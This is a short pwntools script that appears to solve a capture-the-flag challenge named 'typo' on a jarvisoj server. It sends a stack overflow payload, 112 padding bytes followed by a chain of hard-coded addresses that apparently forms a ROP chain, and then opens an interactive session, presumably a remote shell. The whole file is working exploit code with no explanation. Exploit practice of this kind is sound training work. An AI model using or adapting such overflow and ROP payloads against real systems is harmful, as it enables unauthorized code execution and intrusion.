from pwn import *

# sh = process('./typo')
sh = remote("pwn2.jarvisoj.com", 9888)

payload = 'a'*112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110b4)

sh.sendafter('quit', '\n')
sh.recvline()

sh.sendline(payload)
sh.interactive()
sh.close()
